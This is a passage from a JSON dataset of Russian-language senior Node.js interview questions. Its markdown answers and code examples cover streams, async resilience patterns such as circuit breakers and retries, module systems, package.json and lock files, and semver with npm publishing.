cancelled');\n    }\n  });\n\n// Отмена запроса\ncontroller.abort();\n\n// ✅ Мониторинг памяти\nsetInterval(() => {\n  const usage = process.memoryUsage();\n  console.log({\n    rss: `${Math.round(usage.rss / 1024 / 1024)} MB`,\n    heapUsed: `${Math.round(usage.heapUsed / 1024 / 1024)} MB`,\n    external: `${Math.round(usage.external / 1024 / 1024)} MB`\n  });\n}, 10000);\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 19,
          "question_number_in_chapter": 9,
          "question_chapter": 2,
          "question_title": "Как работают Streams в Node.js? Когда использовать?",
          "answer_markdown": "\n**Ответ:**\n\n**Streams** - это абстракция для работы с потоковыми данными в Node.js. Streams обрабатывают данные по частям (chunks), а не загружают все в память сразу.\n\n**Типы Streams:**\n\n```javascript\nconst fs = require('fs');\nconst { Readable, Writable, Transform, Duplex } = require('stream');\n\n// 1. Readable Stream - чтение данных\nconst readableStream = fs.createReadStream('input.txt');\n\nreadableStream.on('data', (chunk) => {\n  console.log('Received chunk:', chunk.length, 'bytes');\n});\n\nreadableStream.on('end', () => {\n  console.log('Reading complete');\n});\n\n// 2. Writable Stream - запись данных\nconst writableStream = fs.createWriteStream('output.txt');\n\nwritableStream.write('Hello ');\nwritableStream.write('World!\\n');\nwritableStream.end();\n\n// 3. Transform Stream - преобразование данных\nconst { Transform } = require('stream');\n\nconst upperCaseTransform = new Transform({\n  transform(chunk, encoding, callback) {\n    this.push(chunk.toString().toUpperCase());\n    callback();\n  }\n});\n\n// 4. Duplex Stream - чтение И запись\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  // socket это Duplex stream\n  socket.write('Welcome!\\n');\n\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n  });\n});\n```\n\n**Pipe - соединение streams:**\n\n```javascript\nconst fs = require('fs');\nconst zlib = require('zlib');\n\n// Чтение → Сжатие → Запись\nfs.createReadStream('input.txt')\n  .pipe(zlib.createGzip())\n  .pipe(fs.createWriteStream('input.txt.gz'));\n\n// С обработкой ошибок\nconst pipeline = require('stream').pipeline;\n\npipeline(\n  fs.createReadStream('input.txt'),\n  zlib.createGzip(),\n  fs.createWriteStream('input.txt.gz'),\n  (error) => {\n    if (error) {\n      console.error('Pipeline failed:', error);\n    } else {\n      console.log('Pipeline succeeded');\n    }\n  }\n);\n```\n\n**Создание custom Readable stream:**\n\n```javascript\nconst { Readable } = require('stream');\n\nclass NumberStream extends Readable {\n  constructor(max) {\n    super();\n    this.current = 1;\n    this.max = max;\n  }\n\n  _read() {\n    if (this.current <= this.max) {\n      this.push(`${this.current}\\n`);\n      this.current++;\n    } else {\n      this.push(null);  // Конец stream\n    }\n  }\n}\n\nconst numbers = new NumberStream(5);\n\nnumbers.on('data', (chunk) => {\n  console.log('Number:', chunk.toString());\n});\n// Output: 1, 2, 3, 4, 5\n```\n\n**Создание custom Transform stream:**\n\n```javascript\nconst { Transform } = require('stream');\n\nclass JSONParseStream extends Transform {\n  constructor() {\n    super({ objectMode: true });\n  }\n\n  _transform(chunk, encoding, callback) {\n    try {\n      const obj = JSON.parse(chunk.toString());\n      this.push(obj);\n      callback();\n    } catch (error) {\n      callback(error);\n    }\n  }\n}\n\n// Использование\nconst jsonStream = new JSONParseStream();\n\njsonStream.write('{\"name\":\"John\"}');\njsonStream.write('{\"name\":\"Jane\"}');\n\njsonStream.on('data', (obj) => {\n  console.log('Parsed:', obj);  // Получаем объекты\n});\n```\n\n**Object Mode - передача объектов:**\n\n```javascript\nconst { Readable } = require('stream');\n\nconst objectStream = new Readable({\n  objectMode: true,\n  read() {\n    this.push({ id: 1, name: 'Alice' });\n    this.push({ id: 2, name: 'Bob' });\n    this.push(null);\n  }\n});\n\nobjectStream.on('data', (obj) => {\n  console.log(obj);  // Получаем объекты, не Buffer\n});\n```\n\n**Практический пример - обработка большого CSV:**\n\n```javascript\nconst fs = require('fs');\nconst { Transform } = require('stream');\nconst readline = require('readline');\n\nclass CSVParser extends Transform {\n  constructor() {\n    super({ objectMode: true });\n    this.headers = null;\n  }\n\n  _transform(line, encoding, callback) {\n    if (!this.headers) {\n      this.headers = line.split(',');\n      return callback();\n    }\n\n    const values = line.split(',');\n    const obj = {};\n\n    this.headers.forEach((header, index) => {\n      obj[header] = values[index];\n    });\n\n    this.push(obj);\n    callback();\n  }\n}\n\n// Обработка огромного CSV файла (100GB+)\nconst fileStream = fs.createReadStream('huge-data.csv');\nconst rl = readline.createInterface({\n  input: fileStream,\n  crlfDelay: Infinity\n});\n\nconst csvParser = new CSVParser();\n\nlet count = 0;\n\nrl.on('line', (line) => {\n  csvParser.write(line);\n});\n\ncsvParser.on('data', (obj) => {\n  count++;\n  if (count % 1000 === 0) {\n    console.log(`Processed ${count} rows`);\n  }\n\n  // Обработка каждой строки\n  // Память остается постоянной!\n});\n\nrl.on('close', () => {\n  csvParser.end();\n  console.log(`Total: ${count} rows`);\n});\n```\n\n**Backpressure - управление потоком:**\n\n```javascript\nconst fs = require('fs');\n\nconst readable = fs.createReadStream('large-file.txt');\nconst writable = fs.createWriteStream('output.txt');\n\nreadable.on('data', (chunk) => {\n  // write() возвращает false если buffer полон\n  const canContinue = writable.write(chunk);\n\n  if (!canContinue) {\n    // Останавливаем чтение\n    readable.pause();\n    console.log('Paused reading due to backpressure');\n  }\n});\n\nwritable.on('drain', () => {\n  // Buffer освободился, продолжаем чтение\n  console.log('Resumed reading');\n  readable.resume();\n});\n\n// Или просто используйте pipe() - он управляет backpressure автоматически\nreadable.pipe(writable);\n```\n\n**HTTP Streaming:**\n\n```javascript\nconst http = require('http');\nconst fs = require('fs');\n\n// ❌ ПЛОХО - загружает весь файл в память\nhttp.createServer((req, res) => {\n  fs.readFile('large-video.mp4', (err, data) => {\n    res.end(data);  // Может упасть если файл 5GB\n  });\n}).listen(3000);\n\n// ✅ ХОРОШО - стриминг\nhttp.createServer((req, res) => {\n  const stream = fs.createReadStream('large-video.mp4');\n  stream.pipe(res);  // Постоянная память, любой размер файла\n}).listen(3000);\n\n// ✅ С поддержкой Range requests (для видео)\nhttp.createServer((req, res) => {\n  const range = req.headers.range;\n\n  if (!range) {\n    return res.status(400).send('Range header required');\n  }\n\n  const videoSize = fs.statSync('video.mp4').size;\n  const CHUNK_SIZE = 10 ** 6; // 1MB\n  const start = Number(range.replace(/\\D/g, ''));\n  const end = Math.min(start + CHUNK_SIZE, videoSize - 1);\n\n  res.writeHead(206, {\n    'Content-Range': `bytes ${start}-${end}/${videoSize}`,\n    'Accept-Ranges': 'bytes',\n    'Content-Length': end - start + 1,\n    'Content-Type': 'video/mp4',\n  });\n\n  const stream = fs.createReadStream('video.mp4', { start, end });\n  stream.pipe(res);\n}).listen(3000);\n```\n\n**Async Iterators со Streams:**\n\n```javascript\nconst fs = require('fs');\n\nasync function processLargeFile() {\n  const stream = fs.createReadStream('huge-file.txt');\n\n  // Stream поддерживает async iteration!\n  for await (const chunk of stream) {\n    console.log('Processing chunk:', chunk.length, 'bytes');\n\n    // Можем использовать await внутри\n    await processChunk(chunk);\n  }\n\n  console.log('Done!');\n}\n\nasync function processChunk(chunk) {\n  // Асинхронная обработка\n  return new Promise(resolve => {\n    setTimeout(resolve, 100);\n  });\n}\n```\n\n**Когда использовать Streams:**\n\n**✅ Используйте Streams когда:**\n- Работа с большими файлами (>100MB)\n- HTTP upload/download\n- Видео/аудио стриминг\n- Обработка логов в реальном времени\n- Database export/import\n- Постоянная память критична\n\n**❌ НЕ используйте Streams когда:**\n- Маленькие файлы (<1MB)\n- Нужны все данные сразу для обработки\n- Простая операция (Streams добавляют сложность)\n\n**Сравнение Streams vs загрузка в память:**\n\n```javascript\n// Без Streams - память растет\nconst fs = require('fs');\n\nfs.readFile('5gb-file.txt', (err, data) => {\n  // Требует 5GB RAM!\n  console.log(data.length);\n});\n\n// Со Streams - постоянная память\nconst stream = fs.createReadStream('5gb-file.txt');\nlet total = 0;\n\nstream.on('data', (chunk) => {\n  total += chunk.length;\n  // Использует ~64KB RAM\n});\n\nstream.on('end', () => {\n  console.log(total);\n});\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 20,
          "question_number_in_chapter": 10,
          "question_chapter": 2,
          "question_title": "Какие паттерны асинхронного программирования используются для обработки ошибок и ретраев?",
          "answer_markdown": "\n**Ответ:**\n\n**Circuit Breaker Pattern:**\n\nПредотвращает каскадные сбои при отказе сервиса.\n\n```javascript\nclass CircuitBreaker {\n  constructor(fn, options = {}) {\n    this.fn = fn;\n    this.failureThreshold = options.failureThreshold || 5;\n    this.timeout = options.timeout || 10000;\n    this.resetTimeout = options.resetTimeout || 60000;\n\n    this.state = 'CLOSED';  // CLOSED, OPEN, HALF_OPEN\n    this.failureCount = 0;\n    this.nextAttempt = Date.now();\n  }\n\n  async execute(...args) {\n    if (this.state === 'OPEN') {\n      if (Date.now() < this.nextAttempt) {\n        throw new Error('Circuit breaker is OPEN');\n      }\n      // Переходим в HALF_OPEN для проверки\n      this.state = 'HALF_OPEN';\n    }\n\n    try {\n      const result = await Promise.race([\n        this.fn(...args),\n        new Promise((_, reject) =>\n          setTimeout(() => reject(new Error('Timeout')), this.timeout)\n        )\n      ]);\n\n      // Успех - сбрасываем счетчик\n      this.onSuccess();\n      return result;\n    } catch (error) {\n      this.onFailure();\n      throw error;\n    }\n  }\n\n  onSuccess() {\n    this.failureCount = 0;\n    this.state = 'CLOSED';\n  }\n\n  onFailure() {\n    this.failureCount++;\n\n    if (this.failureCount >= this.failureThreshold) {\n      this.state = 'OPEN';\n      this.nextAttempt = Date.now() + this.resetTimeout;\n      console.log(`Circuit breaker OPEN. Retry in ${this.resetTimeout}ms`);\n    }\n  }\n}\n\n// Использование\nconst breaker = new CircuitBreaker(\n  async (url) => {\n    const response = await fetch(url);\n    return response.json();\n  },\n  {\n    failureThreshold: 3,\n    timeout: 5000,\n    resetTimeout: 30000\n  }\n);\n\n// Запросы\ntry {\n  const data = await breaker.execute('/api/unstable-service');\n  console.log(data);\n} catch (error) {\n  console.error('Service unavailable:', error.message);\n}\n```\n\n**Retry with Exponential Backoff:**\n\n```javascript\nasync function retry(fn, options = {}) {\n  const {\n    maxRetries = 3,\n    initialDelay = 1000,\n    maxDelay = 30000,\n    factor = 2,\n    onRetry = () => {}\n  } = options;\n\n  let lastError;\n\n  for (let attempt = 0; attempt <= maxRetries; attempt++) {\n    try {\n      return await fn();\n    } catch (error) {\n      lastError = error;\n\n      if (attempt === maxRetries) {\n        throw error;  // Последняя попытка\n      }\n\n      // Exponential backoff: 1s, 2s, 4s, 8s, ...\n      const delay = Math.min(\n        initialDelay * Math.pow(factor, attempt),\n        maxDelay\n      );\n\n      onRetry({ attempt: attempt + 1, delay, error });\n\n      await new Promise(resolve => setTimeout(resolve, delay));\n    }\n  }\n\n  throw lastError;\n}\n\n// Использование\nconst result = await retry(\n  async () => {\n    const response = await fetch('/api/data');\n    if (!response.ok) throw new Error(`HTTP ${response.status}`);\n    return response.json();\n  },\n  {\n    maxRetries: 5,\n    initialDelay: 1000,\n    maxDelay: 30000,\n    factor: 2,\n    onRetry: ({ attempt, delay, error }) => {\n      console.log(`Retry ${attempt} after ${delay}ms. Error: ${error.message}`);\n    }\n  }\n);\n```\n\n**Bulkhead Pattern - изоляция ресурсов:**\n\n```javascript\nclass Bulkhead {\n  constructor(maxConcurrent = 10) {\n    this.maxConcurrent = maxConcurrent;\n    this.running = 0;\n    this.queue = [];\n  }\n\n  async execute(fn) {\n    if (this.running >= this.maxConcurrent) {\n      // Ждем в очереди\n      await new Promise(resolve => this.queue.push(resolve));\n    }\n\n    this.running++;\n\n    try {\n      return await fn();\n    } finally {\n      this.running--;\n\n      // Запускаем следующий из очереди\n      if (this.queue.length > 0) {\n        const resolve = this.queue.shift();\n        resolve();\n      }\n    }\n  }\n}\n\n// Использование\nconst bulkhead = new Bulkhead(5);  // Максимум 5 одновременных запросов\n\nconst promises = Array.from({ length: 20 }, (_, i) =>\n  bulkhead.execute(async () => {\n    console.log(`Request ${i} started`);\n    await fetch(`/api/resource/${i}`);\n    console.log(`Request ${i} completed`);\n  })\n);\n\nawait Promise.all(promises);\n```\n\n**Rate Limiting:**\n\n```javascript\nclass RateLimiter {\n  constructor(maxRequests, windowMs) {\n    this.maxRequests = maxRequests;\n    this.windowMs = windowMs;\n    this.requests = [];\n  }\n\n  async acquire() {\n    const now = Date.now();\n\n    // Удаляем старые запросы\n    this.requests = this.requests.filter(\n      time => now - time < this.windowMs\n    );\n\n    if (this.requests.length >= this.maxRequests) {\n      // Ждем пока окно не обновится\n      const oldestRequest = this.requests[0];\n      const waitTime = this.windowMs - (now - oldestRequest);\n\n      await new Promise(resolve => setTimeout(resolve, waitTime));\n      return this.acquire();  // Рекурсивный вызов\n    }\n\n    this.requests.push(now);\n  }\n\n  async execute(fn) {\n    await this.acquire();\n    return fn();\n  }\n}\n\n// Использование: максимум 10 запросов в минуту\nconst limiter = new RateLimiter(10, 60000);\n\nfor (let i = 0; i < 50; i++) {\n  await limiter.execute(async () => {\n    console.log(`Request ${i} at ${new Date().toISOString()}`);\n    await fetch('/api/data');\n  });\n}\n```\n\n**Fallback Pattern:**\n\n```javascript\nasync function withFallback(primary, fallback, options = {}) {\n  const { timeout = 5000 } = options;\n\n  try {\n    return await Promise.race([\n      primary(),\n      new Promise((_, reject) =>\n        setTimeout(() => reject(new Error('Timeout')), timeout)\n      )\n    ]);\n  } catch (primaryError) {\n    console.warn('Primary failed, trying fallback:', primaryError.message);\n\n    try {\n      return await fallback();\n    } catch (fallbackError) {\n      throw new Error(\n        `Both primary and fallback failed. ` +\n        `Primary: ${primaryError.message}, ` +\n        `Fallback: ${fallbackError.message}`\n      );\n    }\n  }\n}\n\n// Использование\nconst data = await withFallback(\n  // Primary - основной сервис\n  async () => {\n    const res = await fetch('https://primary-api.com/data');\n    return res.json();\n  },\n  // Fallback - запасной вариант\n  async () => {\n    const res = await fetch('https://backup-api.com/data');\n    return res.json();\n  },\n  { timeout: 3000 }\n);\n```\n\n**Timeout Pattern:**\n\n```javascript\nfunction withTimeout(promise, timeoutMs, errorMessage) {\n  return Promise.race([\n    promise,\n    new Promise((_, reject) =>\n      setTimeout(\n        () => reject(new Error(errorMessage || 'Operation timed out')),\n        timeoutMs\n      )\n    )\n  ]);\n}\n\n// Использование\ntry {\n  const result = await withTimeout(\n    fetch('/api/slow-endpoint'),\n    5000,\n    'API request timed out after 5 seconds'\n  );\n  console.log(result);\n} catch (error) {\n  console.error(error.message);\n}\n```\n\n**Combining Patterns - надежный API клиент:**\n\n```javascript\nclass ResilientAPIClient {\n  constructor(baseURL, options = {}) {\n    this.baseURL = baseURL;\n\n    // Circuit Breaker\n    this.breaker = new CircuitBreaker(\n      this._fetch.bind(this),\n      {\n        failureThreshold: options.failureThreshold || 5,\n        timeout: options.timeout || 10000,\n        resetTimeout: options.resetTimeout || 60000\n      }\n    );\n\n    // Rate Limiter\n    this.limiter = new RateLimiter(\n      options.maxRequests || 100,\n      options.windowMs || 60000\n    );\n\n    // Bulkhead\n    this.bulkhead = new Bulkhead(options.maxConcurrent || 10);\n  }\n\n  async request(endpoint, options = {}) {\n    // Retry с exponential backoff\n    return retry(\n      async () => {\n        // Rate limiting\n        await this.limiter.acquire();\n\n        // Bulkhead (ограничение одновременных запросов)\n        return this.bulkhead.execute(async () => {\n          // Circuit breaker\n          return this.breaker.execute(endpoint, options);\n        });\n      },\n      {\n        maxRetries: options.maxRetries || 3,\n        initialDelay: 1000,\n        onRetry: ({ attempt, delay, error }) => {\n          console.log(`Retry ${attempt} in ${delay}ms: ${error.message}`);\n        }\n      }\n    );\n  }\n\n  async _fetch(endpoint, options = {}) {\n    const url = `${this.baseURL}${endpoint}`;\n    const response = await fetch(url, options);\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status}: ${response.statusText}`);\n    }\n\n    return response.json();\n  }\n}\n\n// Использование\nconst api = new ResilientAPIClient('https://api.example.com', {\n  failureThreshold: 5,\n  timeout: 10000,\n  maxRequests: 100,\n  maxConcurrent: 10\n});\n\ntry {\n  const data = await api.request('/users');\n  console.log(data);\n} catch (error) {\n  console.error('Request failed:', error);\n}\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 3,
      "chapter_title": "Modules, NPM & Package Management",
      "questions_count": 6,
      "questions": [
        {
          "question_number": 21,
          "question_number_in_chapter": 1,
          "question_chapter": 3,
          "question_title": "В чем разница между CommonJS и ES Modules? Можно ли их использовать вместе?",
          "answer_markdown": "\n**Ответ:**\n\n**CommonJS (CJS)** и **ES Modules (ESM)** - это два разных модульных системы в Node.js.\n\n**CommonJS (require/module.exports):**\n\n```javascript\n// math.js - CommonJS module\nfunction add(a, b) {\n  return a + b;\n}\n\nfunction subtract(a, b) {\n  return a - b;\n}\n\n// Экспорт\nmodule.exports = {\n  add,\n  subtract\n};\n\n// Или\nexports.add = add;\nexports.subtract = subtract;\n\n// app.js - использование\nconst math = require('./math');\nconsole.log(math.add(2, 3));  // 5\n\n// Деструктуризация\nconst { add, subtract } = require('./math');\n```\n\n**ES Modules (import/export):**\n\n```javascript\n// math.mjs - ES Module\nexport function add(a, b) {\n  return a + b;\n}\n\nexport function subtract(a, b) {\n  return a - b;\n}\n\n// Или default export\nexport default {\n  add,\n  subtract\n};\n\n// app.mjs - использование\nimport { add, subtract } from './math.mjs';\nconsole.log(add(2, 3));  // 5\n\n// Default import\nimport math from './math.mjs';\n\n// Динамический import\nconst math = await import('./math.mjs');\n```\n\n**Ключевые различия:**\n\n| Характеристика | CommonJS | ES Modules |\n|---------------|----------|------------|\n| Синтаксис | `require()`, `module.exports` | `import`, `export` |\n| Загрузка | Синхронная | Асинхронная |\n| Когда выполняется | Runtime | Compile time |\n| Динамический import | Да (всегда) | Да (через `import()`) |\n| Top-level await | Нет | Да |\n| this | module.exports | undefined |\n| __dirname, __filename | Есть | Нет (нужен import.meta.url) |\n| Расширение файла | .js | .mjs или .js с \"type\": \"module\" |\n\n**Включение ES Modules в Node.js:**\n\n```json\n// package.json\n{\n  \"type\": \"module\"  // Все .js файлы как ES modules\n}\n```\n\n**Или использовать расширение .mjs:**\n\n```javascript\n// file.mjs - автоматически ES module\nimport fs from 'fs';\n```\n\n**Использование вместе (Interoperability):**\n\n```javascript\n// 1. Import CommonJS в ES Module\n// math.cjs (CommonJS)\nmodule.exports = {\n  add: (a, b) => a + b\n};\n\n// app.mjs (ES Module)\nimport math from './math.cjs';\nconsole.log(math.add(2, 3));  // ✅ Работает\n\n// 2. Import ES Module в CommonJS (сложнее)\n// math.mjs (ES Module)\nexport const add = (a, b) => a + b;\n\n// app.cjs (CommonJS)\n// ❌ НЕ работает:\n// const math = require('./math.mjs');\n\n// ✅ Работает через динамический import:\n(async () => {\n  const math = await import('./math.mjs');\n  console.log(math.add(2, 3));\n})();\n```\n\n**Top-level await в ES Modules:**\n\n```javascript\n// config.mjs - ES Module\nconst response = await fetch('https://api.example.com/config');\nconst config = await response.json();\n\nexport default config;\n\n// app.mjs\nimport config from './config.mjs';\nconsole.log(config);  // Работает!\n```\n\n**__dirname и __filename в ES Modules:**\n\n```javascript\n// CommonJS\nconsole.log(__dirname);   // /path/to/directory\nconsole.log(__filename);  // /path/to/directory/file.js\n\n// ES Modules - нужно использовать import.meta.url\nimport { fileURLToPath } from 'url';\nimport { dirname } from 'path';\n\nconst __filename = fileURLToPath(import.meta.url);\nconst __dirname = dirname(__filename);\n\nconsole.log(__dirname);   // /path/to/directory\nconsole.log(__filename);  // /path/to/directory/file.mjs\n```\n\n**Conditional exports в package.json:**\n\n```json\n{\n  \"name\": \"my-package\",\n  \"exports\": {\n    \".\": {\n      \"import\": \"./dist/index.mjs\",    // ES Module\n      \"require\": \"./dist/index.cjs\"    // CommonJS\n    }\n  }\n}\n```\n\n**Когда использовать что:**\n\n**CommonJS:**\n- Legacy проекты\n- Нужна синхронная загрузка\n- Совместимость со старыми версиями Node.js (<12)\n\n**ES Modules:**\n- Новые проекты\n- Нужен top-level await\n- Статический анализ (tree shaking)\n- Стандарт будущего\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 22,
          "question_number_in_chapter": 2,
          "question_chapter": 3,
          "question_title": "Что такое package.json и package-lock.json? В чем разница между npm install и npm ci?",
          "answer_markdown": "\n**Ответ:**\n\n**package.json:**\n\nЭто манифест проекта, содержащий метаданные и зависимости.\n\n```json\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"My awesome app\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"node index.js\",\n    \"dev\": \"nodemon index.js\",\n    \"test\": \"jest\",\n    \"build\": \"webpack\"\n  },\n  \"dependencies\": {\n    \"express\": \"^4.18.2\",      // ^ = minor updates (4.x.x)\n    \"mongoose\": \"~7.0.0\"        // ~ = patch updates (7.0.x)\n  },\n  \"devDependencies\": {\n    \"jest\": \"^29.0.0\",\n    \"nodemon\": \"^2.0.20\"\n  },\n  \"engines\": {\n    \"node\": \">=16.0.0\",\n    \"npm\": \">=8.0.0\"\n  },\n  \"keywords\": [\"api\", \"backend\"],\n  \"author\": \"Your Name\",\n  \"license\": \"MIT\"\n}\n```\n\n**Семантическое версионирование (SemVer):**\n\n```\nMAJOR.MINOR.PATCH\n  1  .  2  .  3\n\nMAJOR: Breaking changes (несовместимые изменения)\nMINOR: Новая функциональность (обратно совместимая)\nPATCH: Исправления багов\n```\n\n**Символы версий:**\n\n```json\n{\n  \"dependencies\": {\n    \"express\": \"4.18.2\",     // Точная версия\n    \"mongoose\": \"^7.0.0\",    // >=7.0.0 <8.0.0 (minor updates)\n    \"lodash\": \"~4.17.0\",     // >=4.17.0 <4.18.0 (patch updates)\n    \"axios\": \"*\",            // Любая версия (ПЛОХО!)\n    \"jest\": \">=29.0.0\",      // Минимум 29.0.0\n    \"webpack\": \"5.x\"         // Любой 5.x.x\n  }\n}\n```\n\n**package-lock.json:**\n\nФиксирует **точные версии** всех зависимостей (включая транзитивные).\n\n```json\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"node_modules/express\": {\n      \"version\": \"4.18.2\",           // Точная версия\n      \"resolved\": \"https://registry.npmjs.org/express/-/express-4.18.2.tgz\",\n      \"integrity\": \"sha512-...\",   // Checksum для безопасности\n      \"dependencies\": {\n        \"body-parser\": \"1.20.1\",\n        \"cookie\": \"0.5.0\"\n        // ... все транзитивные зависимости\n      }\n    }\n  }\n}\n```\n\n**Зачем нужен package-lock.json:**\n\n1. **Детерминированные установки** - одинаковые версии на всех машинах\n2. **Быстрая установка** - известна точная структура зависимостей\n3. **Безопасность** - integrity checksums\n4. **Воспроизводимость** - одинаковые сборки в CI/CD\n\n**npm install vs npm ci:**\n\n**npm install:**\n\n```bash\nnpm install\n```\n\n- Устанавливает зависимости из package.json\n- **Обновляет** package-lock.json если нужно\n- Может установить **более новые** версии (в пределах semver)\n- **Медленнее**\n- Используется для **разработки**\n\n```bash\n# Пример проблемы с npm install\n# package.json: \"express\": \"^4.17.0\"\n# На машине A: установится 4.17.1\n# На машине B (через месяц): установится 4.18.0\n# Разные версии! Потенциальные баги!\n```\n\n**npm ci (Clean Install):**\n\n```bash\nnpm ci\n```\n\n- Устанавливает **точные версии** из package-lock.json\n- **НЕ изменяет** package-lock.json\n- **Удаляет** node_modules перед установкой\n- **Быстрее** (в 2-3 раза)\n- Используется в **CI/CD**\n- **Требует** наличие package-lock.json\n\n```bash\n# npm ci гарантирует одинаковые версии везде\n# Всегда устанавливает точно то, что в package-lock.json\n```\n\n**Сравнение:**\n\n| Характеристика | npm install | npm ci |\n|---------------|-------------|---------|\n| Скорость | Медленнее | Быстрее (2-3x) |\n| Изменяет lock файл | Да | Нет |\n| Удаляет node_modules | Нет | Да |\n| Требует lock файл | Нет | Да |\n| Версии | Может обновить | Точные из lock |\n| Use case | Development | CI/CD, Production |\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 23,
          "question_number_in_chapter": 3,
          "question_chapter": 3,
          "question_title": "Что такое semantic versioning (semver)? Как правильно публиковать npm пакеты?",
          "answer_markdown": "\n**Ответ:**\n\n**Semantic Versioning (SemVer):**\n\nФормат: **MAJOR.MINOR.PATCH** (например, 2.4.1)\n\n```\n┌─── MAJOR (2) - Breaking changes\n│  ┌─── MINOR (4) - New features (backward compatible)\n│  │  ┌─── PATCH (1) - Bug fixes\n↓  ↓  ↓\n2. 4. 1\n```\n\n**Правила изменения версий:**\n\n```bash\n# 1.0.0 → 1.0.1 (PATCH)\n# Исправление бага, обратно совместимо\nnpm version patch\n\n# 1.0.1 → 1.1.0 (MINOR)\n# Новая функциональность, обратно совместимо\nnpm version minor\n\n# 1.1.0 → 2.0.0 (MAJOR)\n# Breaking change, НЕ обратно совместимо\nnpm version major\n```\n\n**Примеры breaking changes:**\n\n```javascript\n// Версия 1.0.0\nfunction getUserName(user) {\n  return user.name;\n}\n\n// Версия 2.0.0 - BREAKING CHANGE\nfunction getUserName(user) {\n  return `${user.firstName} ${user.lastName}`;  // Изменился формат!\n}\n\n// Версия 1.1.0 - NOT breaking (новая функция)\nfunction getUserFullName(user) {\n  return `${user.firstName} ${user.lastName}`;\n}\n```\n\n**Pre-release версии:**\n\n```bash\n# Alpha, Beta, RC версии\n1.0.0-alpha.1\n1.0.0-beta.1\n1.0.0-rc.1\n\n# Установка pre-release\nnpm install package@next\nnpm install package@beta\n```\n\n**Публикация npm пакета:**\n\n**1. Подготовка package.json:**\n\n```json\n{\n  \"name\": \"@your-scope/package-name\",  // Scoped package\n  \"version\": \"1.0.0\",\n  \"description\": \"Package description\",\n  \"main\": \"dist/index.js\",             // Entry point для CommonJS\n  \"module\": \"dist/index.mjs\",          // Entry point для ES modules\n  \"types\": \"dist/index.d.ts\",          // TypeScript definitions\n  \"files\": [                           // Файлы для публикации\n    \"dist\",\n    \"README.md\",\n    \"LICENSE\"\n  ],\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"test\": \"jest\",\n    \"prepublishOnly\": \"npm test && npm run build\"\n  },\n  \"keywords\": [\"keyword1\", \"keyword2\"],\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/user/repo.git\"\n  },\n  \"bugs\": {\n    \"url\": \"https://github.com/user/repo/issues\"\n  },\n  \"homepage\": \"https://github.com/user/repo#readme\",\n  \"author\": \"Your Name <email@example.com>\",\n  \"license\": \"MIT\",\n  \"peerDependencies\": {\n    \"react\": \">=16.8.0\"                // Для React библиотек\n  },\n  \"devDependencies\": {\n    \"typescript\": \"^5.0.0\",\n    \"jest\": \"^29.0.0\"\n  }\n}\n```\n\n**2. .npmignore (что НЕ публиковать):**\n\n```\n# .npmignore\nsrc/\ntests/\n.env\n.git\n.github\nnode_modules/\ncoverage/\n*.test.js\ntsconfig.json\n```\n\n**3. Создание npm аккаунта:**\n\n```bash\n# Регистрация\nnpm adduser\n\n# Или логин\nnpm login\n\n# Проверка\nnpm whoami\n```\n\n**4. Публикация:**\n\n```bash\n# 1. Проверить что будет опубликовано\nnpm pack --dry-run\n\n# 2. Локальное тестирование\nnpm link\ncd ../test-project\nnpm link your-package\n\n# 3. Проверка перед публикацией\nnpm run test\nnpm run build\n\n# 4. Публикация\nnpm publish\n\n# Для scoped packages (по умолчанию private)\nnpm publish --access public\n\n# Pre-release версия\nnpm publish --tag beta\nnpm publish --tag next\n```\n\n**5. Обновление версии:**\n\n```bash\n# Автоматически обновить версию и создать git tag\nnpm version patch   # 1.0.0 → 1.0.1\nnpm version minor   # 1.0.1 → 1.1.0\nnpm version major   # 1.1.0 → 2.0.0\n\n# Опубликовать новую версию\nnpm publish\n\n# Push с тегами\ngit push --follow-tags\n```\n\n**Lifecycle scripts:**\n\n```json\n{\n  \"scripts\": {\n    \"prepublishOnly\": \"npm test && npm run build\",  // Перед publish\n    \"preversion\": \"npm test\",                       // Перед version bump\n    \"version\": \"npm run build && git add -A\",       // После version bump\n    \"postversion\": \"git push && git push --tags\"    // После version bump\n  }\n}\n```\n\n**Deprecation пакета:**\n\n```bash\n# Пометить версию как deprecated\nnpm deprecate package@1.0.0 \"Please upgrade to 2.0.0\"\n\n# Удалить пакет (можно только в течение 72 часов!)\nnpm unpublish package@1.0.0\n\n# Удалить весь пакет\nnpm unpublish package --force\n```\n\n**Scoped packages (@scope/package):**\n\n```bash\n# Создание scoped package\nnpm init --scope=@your-username\n\n# Публикация (по умолчанию private)\nnpm publish --access public\n\n# Установка\nnpm install @your-username/package-name\n```\n\n**npm tags:**\n\n```bash\n# Публикация с тегом\nnpm publish --tag beta\n\n# Установка по тегу\nnpm install package@beta\nnpm install package@next\n\n# Управление тегами\nnpm dist-tag add package@1.0.0 stable\nnpm dist-tag rm package beta\nnpm dist-tag ls package\n```\n\n",
          "best_practices": [
            "Changed API signature",
            "New feature X",
            "Bug in feature Y"
          ],
          "difficulty": "Senior"
        },
        {
          "question_number": 24,
          "question_number_in_chapter": 4,
          "question_chapter": 3,
          "question_title": "Как работает node_modules и разрешение модулей? Что такое hoisting?",
